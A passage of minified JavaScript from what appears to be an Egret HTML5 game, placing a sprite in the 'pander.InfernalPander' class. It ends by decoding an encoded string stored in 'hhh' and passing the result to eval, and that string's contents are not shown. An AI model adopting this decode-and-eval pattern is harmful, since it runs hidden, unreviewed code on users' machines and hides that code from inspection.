                    b.x = Math.ceil(0.05 * Main.stageW) + this._pander.width - this._pander.height / 2;
                    b.y = Math.ceil(Main.stagaH / 2 * 0.9) - b.width;
                    break;
                case 2:
                    b.x = Main.stageW / 2 + Math.ceil(0.03 * Main.stageW) / 2 + this._pander.width - this._pander.height / 2;
                    b.y = Math.ceil(Main.stagaH / 2 * 0.9) - b.width;
                    break;
                case 3:
                    b.x = Math.ceil(0.05 * Main.stageW) + this._pander.width - this._pander.height / 2;
                    b.y = Math.ceil(0.85 * Main.stagaH);
                    break;
                case 4:
                    b.x = Main.stageW / 2 + Math.ceil(0.03 *
                    Main.stageW) / 2 + this._pander.width - this._pander.height / 2, b.y = Math.ceil(0.85 * Main.stagaH)
            }
        };
        return a
    }(egret.DisplayObjectContainer);
    b.InfernalPander = e;
    e.prototype.__class__ = "pander.InfernalPander"
})(pander || (pander = {}));
var resultde = aperture.encrypt.SimpleEncode.decode(JSON.parse(hhh));
eval(resultde)